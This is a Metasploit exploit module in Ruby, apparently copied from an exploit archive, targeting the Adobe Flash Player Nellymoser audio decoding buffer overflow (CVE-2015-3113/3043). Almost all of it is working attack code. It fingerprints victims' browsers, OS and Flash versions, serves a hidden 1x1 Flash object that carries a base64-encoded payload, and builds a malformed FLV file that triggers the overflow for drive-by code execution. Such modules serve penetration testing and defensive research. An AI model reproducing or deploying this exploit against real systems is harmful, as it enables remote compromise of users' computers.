# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;                => &#039;Adobe Flash Player Nellymoser Audio Decoding Buffer Overflow&#039;,
      &#039;Description&#039;         => %q{
        This module exploits a buffer overflow on Adobe Flash Player when handling nellymoser
        encoded audio inside a FLV video, as exploited in the wild on June 2015. This module
        has been tested successfully on:
 
        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.160,
        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.160,
        Windows 8.1, Firefox 38.0.5 and Adobe Flash 18.0.0.160,
        Linux Mint "Rebecca" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.466, and
        Ubuntu 14.04.2 LTS, Firefox 35.01, and Adobe Flash 11.2.202.466.
 
        Note that this exploit is effective against both CVE-2015-3113 and the
        earlier CVE-2015-3043, since CVE-2015-3113 is effectively a regression
        to the same root cause as CVE-2015-3043.
      },
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              =>
        [
          &#039;Unknown&#039;, # Exploit in the wild
          &#039;juan vazquez&#039; # msf module
        ],
      &#039;References&#039;          =>
        [
          [&#039;CVE&#039;, &#039;2015-3043&#039;],
          [&#039;CVE&#039;, &#039;2015-3113&#039;],
          [&#039;URL&#039;, &#039;https://helpx.adobe.com/security/products/flash-player/apsb15-06.html&#039;],
          [&#039;URL&#039;, &#039;https://helpx.adobe.com/security/products/flash-player/apsb15-14.html&#039;],
          [&#039;URL&#039;, &#039;http://blog.trendmicro.com/trendlabs-security-intelligence/new-adobe-zero-day-shares-same-root-cause-as-older-flaws/&#039;],
          [&#039;URL&#039;, &#039;http://malware.dontneedcoffee.com/2015/06/cve-2015-3113-flash-up-to-1800160-and.html&#039;],
          [&#039;URL&#039;, &#039;http://bobao.360.cn/learning/detail/357.html&#039;]
        ],
      &#039;Payload&#039;             =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;            => [&#039;win&#039;, &#039;linux&#039;],
      &#039;Arch&#039;                => [ARCH_X86],
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script|headers/i,
          :arch    => ARCH_X86,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::LINUX ||
              os =~ OperatingSystems::Match::WINDOWS_7 ||
              os =~ OperatingSystems::Match::WINDOWS_81
          end,
          :ua_name => lambda do |ua|
            case target.name
            when &#039;Windows&#039;
              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF
            when &#039;Linux&#039;
              return true if ua == Msf::HttpClients::FF
            end
 
            false
          end,
          :flash   => lambda do |ver|
            case target.name
            when &#039;Windows&#039;
              return true if ver =~ /^18\./ && Gem::Version.new(ver) <= Gem::Version.new(&#039;18.0.0.161&#039;)
              return true if ver =~ /^17\./ && Gem::Version.new(ver) != Gem::Version.new(&#039;17.0.0.169&#039;)
            when &#039;Linux&#039;
              return true if ver =~ /^11\./ && Gem::Version.new(ver) <= Gem::Version.new(&#039;11.2.202.466&#039;) && Gem::Version.new(ver) != Gem::Version.new(&#039;11.2.202.457&#039;)
            end
 
            false
          end
        },
      &#039;Targets&#039;             =>
        [
          [ &#039;Windows&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Linux&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;Privileged&#039;          => false,
      &#039;DisclosureDate&#039;      => &#039;Jun 23 2015&#039;,
      &#039;DefaultTarget&#039;       => 0))
  end
 
  def exploit
    @swf = create_swf
    @flv = create_flv
 
    super
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")
 
    if request.uri =~ /\.swf$/
      print_status(&#039;Sending SWF...&#039;)
      send_response(cli, @swf, {&#039;Content-Type&#039;=>&#039;application/x-shockwave-flash&#039;, &#039;Cache-Control&#039; => &#039;no-cache, no-store&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;})
      return
    end
 
    if request.uri =~ /\.flv$/
      print_status(&#039;Sending FLV...&#039;)
      send_response(cli, @flv, {&#039;Content-Type&#039;=>&#039;video/x-flv&#039;, &#039;Cache-Control&#039; => &#039;no-cache, no-store&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;})
      return
    end
 
    print_status(&#039;Sending HTML...&#039;)
    send_exploit_html(cli, exploit_template(cli, target_info), {&#039;Pragma&#039; => &#039;no-cache&#039;})
  end
 
  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    os_name = target_info[:os_name]
 
    if target.name =~ /Windows/
      platform_id = &#039;win&#039;
    elsif target.name =~ /Linux/
      platform_id = &#039;linux&#039;
    end
 
    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" Play="true"/>
    </object>
    </body>
    </html>
    |
 
    return html_template, binding()
  end
 
  def create_swf
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-3113&#039;, &#039;msf.swf&#039;)
    swf =  ::File.open(path, &#039;rb&#039;) { |f| swf = f.read }
 
    swf
  end
 
  def create_flv
    header = &#039;&#039;
    header << &#039;FLV&#039; # signature
    header << [1].pack(&#039;C&#039;) # version
    header << [4].pack(&#039;C&#039;) # Flags: TypeFlagsAudio
    header << [9].pack(&#039;N&#039;) # DataOffset
 
    data = &#039;&#039;
    data << "\x68" # fmt = 6 (Nellymoser), SoundRate: 2, SoundSize: 0, SoundType: 0
    data << "\xee" * 0x440 # SoundData
 
    tag1 = &#039;&#039;
    tag1 << [8].pack(&#039;C&#039;)  # TagType (audio)
    tag1 << "\x00\x04\x41" # DataSize
    tag1 << "\x00\x00\x1a" # TimeStamp
    tag1 << [0].pack(&#039;C&#039;)  # TimeStampExtended
    tag1 << "\x00\x00\x00" # StreamID, always 0
    tag1 << data
 
    body = &#039;&#039;
    body << [0].pack(&#039;N&#039;) # PreviousTagSize
    body << tag1
    body << [0xeeeeeeee].pack(&#039;N&#039;) # PreviousTagSize
 
    flv = &#039;&#039;
    flv << header
    flv << body
 
    flv
  end
end

